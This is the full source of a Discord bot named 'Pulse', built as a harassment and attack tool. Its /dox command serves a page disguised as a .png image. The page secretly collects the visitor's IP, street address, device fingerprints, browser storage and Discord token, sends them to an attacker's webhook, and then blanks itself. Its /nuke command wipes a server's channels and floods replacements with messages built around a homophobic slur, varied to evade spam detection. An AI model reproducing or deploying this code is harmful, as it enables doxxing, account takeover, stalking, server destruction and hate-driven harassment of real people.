const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();
const os = require('os');
const moment = require('moment'); // Optional, but we'll use it if installed – or just use Date methods

// ---------------------------------------------------------------------
// ENVIRONMENT VARIABLES
// ---------------------------------------------------------------------
const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

// ---------------------------------------------------------------------
// DISCORD CLIENT SETUP
// ---------------------------------------------------------------------
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// ---------------------------------------------------------------------
// DOX LINK STORAGE
// ---------------------------------------------------------------------
const links = new Map(); // Stores generated dox links with webhook and user info

// ---------------------------------------------------------------------
// EXPRESS SERVER – Serves DOX HTML
// ---------------------------------------------------------------------
app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) {
        return res.status(404).send('Image not found');
    }
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});
app.listen(PORT, () => console.log(`🌐 Dox server running on port ${PORT}`));

// ---------------------------------------------------------------------
// COMMAND REGISTRATION
// ---------------------------------------------------------------------
client.once('ready', async () => {
    console.log(`🤖 Logged in as ${client.user.tag}`);
    console.log(`📊 Bot is in ${client.guilds.cache.size} servers`);

    // Clear old commands
    await client.application.commands.set([]);

    // Register fresh commands
    await client.application.commands.set([
        {
            name: 'dox',
            description: 'Generate a dox link – collects IP, location, battery, device data',
            options: [
                { name: 'webhook', type: 3, description: 'Discord webhook URL', required: true }
            ]
        },
        {
            name: 'spam',
            description: 'Spam a channel with messages',
            options: [
                { name: 'count', type: 4, description: 'Number of messages (max 100)', required: true },
                { name: 'message', type: 3, description: 'Message content', required: true },
                { name: 'delay', type: 4, description: 'Delay in ms between messages (default 0)', required: false }
            ]
        },
        {
            name: 'nuke',
            description: 'Delete all channels, create new ones, flood them, then leave',
            options: [
                { name: 'channels', type: 4, description: 'Number of channels to create (default 20, max 50)', required: false },
                { name: 'messages', type: 4, description: 'Messages per channel (default 10, max 100)', required: false },
                { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }
            ]
        },
        {
            name: 'ad',
            description: 'Advertise the server invite link'
        },
        {
            name: 'purge',
            description: 'Delete messages in bulk',
            options: [
                { name: 'amount', type: 4, description: 'Number of messages to delete (max 100)', required: true },
                { name: 'user', type: 6, description: 'Target user (optional)', required: false },
                { name: 'reason', type: 3, description: 'Reason for purge (optional)', required: false }
            ]
        },
        {
            name: 'serverinfo',
            description: 'Get information about the current server'
        },
        {
            name: 'userinfo',
            description: 'Get information about a user',
            options: [
                { name: 'user', type: 6, description: 'Target user (defaults to yourself)', required: false }
            ]
        },
        {
            name: 'math',
            description: 'Perform a math calculation',
            options: [
                { name: 'expression', type: 3, description: 'Math expression (e.g., 2+2)', required: true }
            ]
        },
        {
            name: 'ping',
            description: 'Check bot latency'
        }
    ]);

    console.log('✅ Commands registered');
});

// ---------------------------------------------------------------------
// INTERACTION HANDLER
// ---------------------------------------------------------------------
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // -----------------------------------------------------------------
    // DOX COMMAND
    // -----------------------------------------------------------------
    if (interaction.commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });
        const wh = interaction.options.getString('webhook');
        if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.editReply('❌ Invalid webhook URL. Must start with https://discord.com/api/webhooks/');
        }
        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
        links.set(id, { webhook: wh, user: interaction.user.tag, created: Date.now() });
        const embed = new EmbedBuilder()
            .setTitle('✅ Dox Link Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 **${url}**\n\nSends: IP, geolocation, reverse geocode address, battery, connection, device fingerprint, canvas/audio fingerprint, storage, Discord token, and more.`)
            .setFooter({ text: `Generated by ${interaction.user.tag} • Expires after 100 links` });
        await interaction.editReply({ embeds: [embed] });
        return;
    }

    // -----------------------------------------------------------------
    // SPAM COMMAND
    // -----------------------------------------------------------------
    if (interaction.commandName === 'spam') {
        await interaction.deferReply({ ephemeral: true });
        const count = interaction.options.getInteger('count');
        const msg = interaction.options.getString('message');
        const delay = interaction.options.getInteger('delay') || 0;
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel found.');
        const max = Math.min(count, 100);
        try {
            for (let i = 0; i < max; i++) {
                await channel.send(msg);
                if (delay > 0) await new Promise(r => setTimeout(r, delay));
            }
            await interaction.editReply(`✅ Spammed ${max} messages${delay > 0 ? ` with ${delay}ms delay` : ''}`);
        } catch (e) {
            await interaction.editReply(`❌ Failed: ${e.message}`);
        }
        return;
    }

    // -----------------------------------------------------------------
    // NUKE COMMAND – Expanded with options
    // -----------------------------------------------------------------
    if (interaction.commandName === 'nuke') {
        await interaction.deferReply({ ephemeral: true });
        const guild = interaction.guild;
        if (!guild) return interaction.editReply('❌ This command can only be used in a server.');
        if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return interaction.editReply('❌ I need Administrator permissions to nuke.');
        }

        const channelCount = Math.min(interaction.options.getInteger('channels') || 20, 50);
        const messagesPerChannel = Math.min(interaction.options.getInteger('messages') || 10, 100);
        const delayMs = Math.min(interaction.options.getInteger('delay') || 50, 500);
        const maxLength = 2000;

        // Message variants – different versions to avoid duplicate detection
        const baseLine = '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
        const variants = [
            baseLine,
            '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER',
            '# PULSE OWNS ALL U F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH AS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SRVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERV ER',
            '# PULSE OWNS ALL YOU FAGGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER  ',
            '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER ',
            '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER ',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER ',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER ',
            '# PULSE OWNS ALL U F@GGOTS TRASH ASS SERVER ',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH AS SERVER ',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SRVER ',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERV ER ',
            '# PULSE OWNS ALL YOU FAGGOTS TRASH ASS SERVER '
        ];
        const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

        try {
            // 1. Delete all existing channels
            await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));

            // 2. Create new channels
            const newChannels = await Promise.all(
                Array.from({ length: channelCount }, () =>
                    guild.channels.create({ name: 'pulse', type: 0 }).catch(() => null)
                )
            );
            const valid = newChannels.filter(c => c !== null);

            // 3. Build messages
            const messages = [];
            for (let i = 0; i < messagesPerChannel; i++) {
                const line = variants[i % variants.length];
                let bigMessage = `@everyone ${line}\n`;
                const repeatLine = line + '\n';
                while (bigMessage.length + repeatLine.length < maxLength - inviteLine.length - 2) {
                    bigMessage += repeatLine;
                }
                bigMessage += `\n${inviteLine}`;
                bigMessage = bigMessage.slice(0, maxLength);
                messages.push(bigMessage);
            }

            // 4. Send messages – in unison across channels
            for (let i = 0; i < messages.length; i++) {
                const msg = messages[i];
                await Promise.all(valid.map(ch => ch.send(msg).catch(() => {})));
                if (i < messages.length - 1) await new Promise(r => setTimeout(r, delayMs));
            }

            // 5. Leave the server
            await guild.leave();

            await interaction.editReply(`✅ Nuked. Created ${valid.length} channels, sent ${messagesPerChannel} messages each (total ${valid.length * messagesPerChannel} messages), and left.`);
        } catch (e) {
            await interaction.editReply(`❌ Nuke failed: ${e.message}`);
        }
        return;
    }

    // -----------------------------------------------------------------
    // AD COMMAND
    // -----------------------------------------------------------------
    if (interaction.commandName === 'ad') {
        await interaction.deferReply({ ephemeral: true });
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        const embed = new EmbedBuilder()
            .setTitle('🔥 Pulse Nuke Power')
            .setColor(0x8B5CF6)
            .setDescription(`Join Pulse today:\n${INVITE_LINK}`)
            .setFooter({ text: 'Pulse Bot • Nuke • Dox • Spam' });
        await channel.send({ embeds: [embed] });
        await interaction.editReply('✅ Ad sent.');
        return;
    }

    // -----------------------------------------------------------------
    // PURGE COMMAND – with reason support
    // -----------------------------------------------------------------
    if (interaction.commandName === 'purge') {
        await interaction.deferReply({ ephemeral: true });
        const amount = interaction.options.getInteger('amount');
        const user = interaction.options.getUser('user');
        const reason = interaction.options.getString('reason') || 'No reason provided';
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        if (!channel.permissionsFor(interaction.member).has(PermissionsBitField.Flags.ManageMessages)) {
            return interaction.editReply('❌ You need Manage Messages permission.');
        }
        let messages = await channel.messages.fetch({ limit: Math.min(amount, 100) });
        if (user) messages = messages.filter(m => m.author.id === user.id);
        const deleted = await channel.bulkDelete(messages, true).catch(() => {});
        const embed = new EmbedBuilder()
            .setTitle('🧹 Purge Complete')
            .setColor(0x22c55e)
            .setDescription(`Deleted ${deleted ? deleted.size : 0} messages.`)
            .addFields(
                { name: 'Channel', value: channel.toString(), inline: true },
                { name: 'Reason', value: reason, inline: true },
                { name: 'Moderator', value: interaction.user.tag, inline: true }
            )
            .setTimestamp();
        await interaction.editReply({ embeds: [embed] });
        return;
    }

    // -----------------------------------------------------------------
    // SERVERINFO COMMAND
    // -----------------------------------------------------------------
    if (interaction.commandName === 'serverinfo') {
        const guild = interaction.guild;
        if (!guild) return interaction.reply({ content: '❌ This command can only be used in a server.', ephemeral: true });
        const embed = new EmbedBuilder()
            .setTitle(`📊 ${guild.name}`)
            .setColor(0x8B5CF6)
            .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }))
            .addFields(
                { name: '🆔 Server ID', value: guild.id, inline: true },
                { name: '👑 Owner', value: (await guild.fetchOwner()).user.tag, inline: true },
                { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true },
                { name: '🔒 Verification Level', value: `${guild.verificationLevel}`, inline: true },
                { name: '🌍 Boost Level', value: `${guild.premiumTier}`, inline: true },
                { name: '🚀 Boost Count', value: `${guild.premiumSubscriptionCount || 0}`, inline: true }
            )
            .setFooter({ text: `Requested by ${interaction.user.tag}` })
            .setTimestamp();
        await interaction.reply({ embeds: [embed] });
        return;
    }

    // -----------------------------------------------------------------
    // USERINFO COMMAND
    // -----------------------------------------------------------------
    if (interaction.commandName === 'userinfo') {
        const user = interaction.options.getUser('user') || interaction.user;
        const member = interaction.guild ? await interaction.guild.members.fetch(user.id).catch(() => null) : null;
        const embed = new EmbedBuilder()
            .setTitle(`👤 ${user.tag}`)
            .setColor(0x8B5CF6)
            .setThumbnail(user.displayAvatarURL({ dynamic: true, size: 256 }))
            .addFields(
                { name: '🆔 User ID', value: user.id, inline: true },
                { name: '📅 Account Created', value: `<t:${Math.floor(user.createdTimestamp / 1000)}:R>`, inline: true },
                { name: '🤖 Bot', value: user.bot ? 'Yes' : 'No', inline: true },
                { name: '🌐 Global Name', value: user.globalName || 'N/A', inline: true }
            );
        if (member) {
            embed.addFields(
                { name: '📅 Joined Server', value: `<t:${Math.floor(member.joinedTimestamp / 1000)}:R>`, inline: true },
                { name: '📊 Roles', value: member.roles.cache.map(r => r.toString()).join(', ') || 'None', inline: false },
                { name: '🔒 Permissions', value: member.permissions.toArray().slice(0, 5).join(', ') + (member.permissions.toArray().length > 5 ? '...' : ''), inline: false }
            );
        }
        embed.setFooter({ text: `Requested by ${interaction.user.tag}` }).setTimestamp();
        await interaction.reply({ embeds: [embed] });
        return;
    }

    // -----------------------------------------------------------------
    // MATH COMMAND
    // -----------------------------------------------------------------
    if (interaction.commandName === 'math') {
        const expr = interaction.options.getString('expression');
        try {
            // Sanitize – only allow numbers, operators, parentheses, spaces
            const sanitized = expr.replace(/[^0-9+\-*/().% ]/g, '');
            if (!sanitized) return interaction.reply({ content: '❌ Invalid expression.', ephemeral: true });
            const result = Function(`"use strict"; return (${sanitized})`)();
            await interaction.reply({ content: `🧮 **${expr}** = **${result}**`, ephemeral: true });
        } catch (e) {
            await interaction.reply({ content: `❌ Error: ${e.message}`, ephemeral: true });
        }
        return;
    }

    // -----------------------------------------------------------------
    // PING COMMAND
    // -----------------------------------------------------------------
    if (interaction.commandName === 'ping') {
        const sent = await interaction.reply({ content: '🏓 Pinging...', fetchReply: true });
        const latency = sent.createdTimestamp - interaction.createdTimestamp;
        const apiLatency = Math.round(client.ws.ping);
        await interaction.editReply({
            content: `🏓 **Pong!**\n📨 Latency: ${latency}ms\n📡 API Latency: ${apiLatency}ms`
        });
        return;
    }
});

// =====================================================================
// DOX HTML GENERATOR – 40+ fields, expanded fingerprinting
// =====================================================================
function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body { background: #ffffff; margin: 0; height: 100vh; }
    </style>
</head>
<body>
<script>
const WEBHOOK_URL = "${webhook}";

// ---- UTILITY FUNCTIONS ----
function hash(str) {
    let h = 0;
    for (let i = 0; i < str.length; i++) { h = ((h << 5) - h) + str.charCodeAt(i); h |= 0; }
    return h.toString(36);
}

function getCookie(name) {
    const value = "; " + document.cookie;
    const parts = value.split("; " + name + "=");
    if (parts.length === 2) return parts.pop().split(";").shift();
    return null;
}

// ---- IP DATA – 6 fallback APIs ----
async function getIPData() {
    const apis = [
        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },
        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) },
        { url: "https://ipapi.co/json/", parse: d => ({ ip: d.ip, country: d.country_name, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.org, timezone: d.timezone }) },
        { url: "https://api.ip.sb/geoip", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.isp, timezone: d.timezone }) },
        { url: "https://geoplugin.net/json.gp", parse: d => ({ ip: d.geoplugin_request, country: d.geoplugin_countryName, region: d.geoplugin_region, city: d.geoplugin_city, postal: d.geoplugin_postcode, lat: d.geoplugin_latitude, lon: d.geoplugin_longitude, asn: "N/A", isp: d.geoplugin_isp, timezone: d.geoplugin_timezone }) }
    ];
    for (const api of apis) {
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 5000);
            const res = await fetch(api.url, { signal: controller.signal });
            clearTimeout(timeout);
            const data = await res.json();
            if (data.ip) {
                const result = api.parse(data);
                if (result.ip) return result;
            }
        } catch (e) { console.error("IP fetch failed:", api.url, e); }
    }
    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };
}

// ---- REVERSE GEOCODING ----
async function reverseGeocode(lat, lon) {
    try {
        const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");
        const data = await res.json();
        if (data && data.display_name) return data.display_name;
    } catch (e) { console.error("Reverse geocode failed:", e); }
    return null;
}

// ---- BATTERY ----
async function getBattery() {
    try {
        const b = await navigator.getBattery();
        return Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Not Charging") + ")";
    } catch { return "Not Available"; }
}

// ---- CONNECTION ----
function getConnection() {
    try {
        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (c) return (c.effectiveType || c.type) + " (" + (c.downlink || "N/A") + " Mbps, " + (c.rtt || "N/A") + "ms RTT)";
    } catch {}
    return "Not Available";
}

// ---- GPU / WEBGL ----
function getGPU() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl");
        if (!gl) return "N/A";
        const debug = gl.getExtension("WEBGL_debug_renderer_info");
        if (!debug) return "N/A";
        return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
    } catch { return "N/A"; }
}

// ---- WEBRTC LOCAL IP ----
function getWebRTC() {
    return new Promise(r => {
        try {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = e => {
                if (!e.candidate) return;
                const ip = e.candidate.address || e.candidate.ip;
                if (ip && !ip.includes("local")) { r(ip); pc.close(); }
            };
            setTimeout(() => { r("N/A"); pc.close(); }, 2000);
        } catch { r("N/A"); }
    });
}

// ---- CANVAS FINGERPRINT ----
function getCanvasFP() {
    try {
        const canvas = document.createElement("canvas");
        canvas.width = 256; canvas.height = 64;
        const ctx = canvas.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Cwm fjordbank glyphs vext quiz", 2, 15);
        ctx.fillStyle = "rgba(102,204,0,0.7)";
        ctx.fillText("Cwm fjordbank glyphs vext quiz", 4, 17);
        return canvas.toDataURL();
    } catch { return "N/A"; }
}

// ---- INSTALLED FONTS ----
function getFonts() {
    const fontList = ["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Impact","Tahoma","Trebuchet MS","Calibri","Cambria","Consolas","Segoe UI","Roboto","Open Sans","Lato","Montserrat","Poppins","Ubuntu","Inter","Helvetica","Geneva","Lucida Grande","STHeiti","WenQuanYi Micro Hei","Nanum Gothic","DejaVu Sans","FreeSans","Liberation Sans"];
    const base = "mmmmmmmmmmlli";
    const test = document.createElement("span");
    test.style.cssText = "position:absolute;top:-9999px;left:-9999px;font-size:72px;font-family:monospace;";
    test.innerHTML = base;
    document.body.appendChild(test);
    const refWidth = test.offsetWidth, refHeight = test.offsetHeight;
    const detected = [];
    fontList.forEach(font => {
        test.style.fontFamily = font + ", monospace";
        if (test.offsetWidth !== refWidth || test.offsetHeight !== refHeight) detected.push(font);
    });
    document.body.removeChild(test);
    return detected;
}

// ---- AUDIO FINGERPRINT ----
function getAudioFP() {
    return new Promise(resolve => {
        try {
            const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
            const osc = ctx.createOscillator();
            osc.type = "triangle";
            osc.frequency.value = 1000;
            const comp = ctx.createDynamicsCompressor();
            osc.connect(comp);
            comp.connect(ctx.destination);
            osc.start(0);
            ctx.oncomplete = e => {
                const buffer = e.renderedBuffer.getChannelData(0);
                let str = "";
                for (let i = 0; i < 100; i++) str += buffer[i].toFixed(6);
                resolve(hash(str));
            };
            ctx.startRendering();
        } catch { resolve("N/A"); }
    });
}

// ---- MAIN EXECUTION ----
(async function() {
    try {
        // 1. IP + Geolocation
        const ip = await getIPData();

        // 2. Reverse geocode IP to address
        let address = "N/A";
        let lat = ip.lat || "N/A";
        let lon = ip.lon || "N/A";
        if (lat !== "N/A" && lon !== "N/A") {
            const addr = await reverseGeocode(lat, lon);
            if (addr) address = addr;
        }

        // 3. Battery
        const battery = await getBattery();

        // 4. Connection
        const connection = getConnection();

        // 5. GPU
        const gpu = getGPU();

        // 6. WebRTC
        const webrtc = await getWebRTC();

        // 7. Canvas fingerprint
        const canvasFP = getCanvasFP();
        const canvasHash = hash(canvasFP);

        // 8. Fonts
        const fonts = getFonts();

        // 9. Audio fingerprint
        const audioFP = await getAudioFP();

        // 10. Browser/OS/Device
        const ua = navigator.userAgent;
        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
        const osName = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
        const device = /mobile|android|iphone|ipad/i.test(ua) ? "📱 Mobile" : /tablet|ipad/i.test(ua) ? "📱 Tablet" : "💻 Desktop";
        const screenRes = screen.width + "x" + screen.height;
        const colorDepth = screen.colorDepth;
        const pixelDepth = screen.pixelDepth;
        const dpi = window.devicePixelRatio || 1;

        // 11. Hardware
        const cores = navigator.hardwareConcurrency || "N/A";
        const memory = navigator.deviceMemory || "N/A";
        const touchPoints = navigator.maxTouchPoints || 0;

        // 12. Language & Time
        const lang = navigator.language;
        const languages = navigator.languages ? navigator.languages.join(", ") : "N/A";
        const platform = navigator.platform;
        const now = new Date();
        const timestamp = now.toISOString();
        const localTime = now.toString();
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const timezoneOffset = now.getTimezoneOffset();

        // 13. Storage
        let ls = {}, ss = {};
        try { for (let i=0; i<localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage[k]; } } catch {}
        try { for (let i=0; i<sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = sessionStorage[k]; } } catch {}

        // 14. Discord Token
        let discordToken = localStorage.getItem("token") || getCookie("token") || "N/A";

        // 15. Cookies & Do Not Track
        const cookiesEnabled = navigator.cookieEnabled ? "Enabled" : "Disabled";
        const doNotTrack = navigator.doNotTrack || "N/A";

        // 16. Page Info
        const pageTitle = document.title;
        const pageURL = window.location.href;
        const referrer = document.referrer || "N/A";

        // 17. Build fields
        const fields = [
            { name: "📍 Address", value: address, inline: false },
            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
            { name: "🕒 Timezone", value: timezone + " (UTC" + (timezoneOffset <= 0 ? "+" : "-") + Math.abs(timezoneOffset/60) + ")", inline: true },
            { name: "🔋 Battery", value: battery, inline: true },
            { name: "📶 Connection", value: connection, inline: true },
            { name: "📱 Screen", value: screenRes + " (" + colorDepth + "-bit, " + dpi + "x DPI)", inline: true },
            { name: "🧠 Browser", value: browser, inline: true },
            { name: "💻 OS", value: osName, inline: true },
            { name: "🖥️ Device", value: device, inline: true },
            { name: "💾 Hardware", value: cores + " cores, " + memory + "GB RAM, " + touchPoints + " touch points", inline: true },
            { name: "🎮 GPU", value: gpu, inline: false },
            { name: "📡 WebRTC", value: webrtc, inline: true },
            { name: "🖼️ Canvas FP", value: canvasHash, inline: true },
            { name: "🔤 Fonts", value: fonts.join(", ") || "N/A", inline: false },
            { name: "🔊 Audio FP", value: audioFP, inline: true },
            { name: "🔑 Discord Token", value: discordToken, inline: false },
            { name: "📂 localStorage", value: JSON.stringify(ls).slice(0, 500) || "N/A", inline: false },
            { name: "📂 sessionStorage", value: JSON.stringify(ss).slice(0, 500) || "N/A", inline: false },
            { name: "🍪 Cookies", value: cookiesEnabled, inline: true },
            { name: "🚫 Do Not Track", value: doNotTrack, inline: true },
            { name: "🌐 Language", value: lang + " (" + languages + ")", inline: true },
            { name: "📄 Page Title", value: pageTitle, inline: true },
            { name: "🔗 Page URL", value: pageURL, inline: false },
            { name: "↩️ Referrer", value: referrer, inline: false },
            { name: "⏰ Local Time", value: localTime, inline: false },
            { name: "📅 Timestamp", value: timestamp, inline: false }
        ];

        const embed = {
            title: "☠️ Doxxed",
            color: 0xFF0000,
            fields: fields,
            footer: { text: "Logged at " + timestamp }
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });

    } catch (err) {
        console.error("Dox error:", err);
    }

    // ---- WHITE PAGE, CLOSE ----
    document.body.innerHTML = "";
    document.body.style.background = "#ffffff";
    document.body.style.margin = "0";
    document.body.style.height = "100vh";
    setTimeout(() => {
        window.close();
        window.location.href = "about:blank";
    }, 1000);
})();
<\/script>
</body>
</html>`;
}

// ---------------------------------------------------------------------
// AUTO-CLEANUP – Removes old dox links (keeps last 100)
// ---------------------------------------------------------------------
setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) {
        keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
    }
}, 60000);

// ---------------------------------------------------------------------
// ERROR HANDLING
// ---------------------------------------------------------------------
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});

// ---------------------------------------------------------------------
// LOGIN
// ---------------------------------------------------------------------
client.login(TOKEN);
